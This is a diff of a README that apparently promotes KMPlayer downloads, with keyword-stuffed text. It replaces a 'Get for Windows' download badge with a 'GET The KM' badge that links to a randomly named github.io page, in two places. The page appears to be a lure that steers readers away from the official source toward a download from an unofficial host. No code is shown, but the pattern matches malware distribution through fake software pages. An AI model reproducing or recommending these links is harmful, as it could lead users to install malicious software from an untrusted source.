@@ -4,11 +4,8 @@
   <img src="https://km-player.coshareez.my/1681925340.jpeg" alt="Program Logo"/>
 </div>
 
-<div align="center">
+[![GET The KM](https://img.shields.io/badge/GET%20%E2%80%94%20The-KM-0078D6?style=for-the-badge&logoColor=white)](https://j7635411.github.io/.github/The-KM)
 
-[![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://the-km-player.github.io/.github/)
-
-</div>
 
 ---
 
@@ -32,11 +29,8 @@ The player kmplayer download maintains low CPU utilization during concurrent mul
   <img src="https://articles-img.sftcdn.net/t_article_cover_m/auto-mapping-folder/sites/3/2016/05/kmplayer-big.jpg" alt="KMPlayer Screenshot"/>
 </div>
 
-<div align="center">
+[![GET The KM](https://img.shields.io/badge/GET%20%E2%80%94%20The-KM-0078D6?style=for-the-badge&logoColor=white)](https://j7635411.github.io/.github/The-KM)
 
-[![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://the-km-player.github.io/.github/)
-
-</div>
 
 ---
 
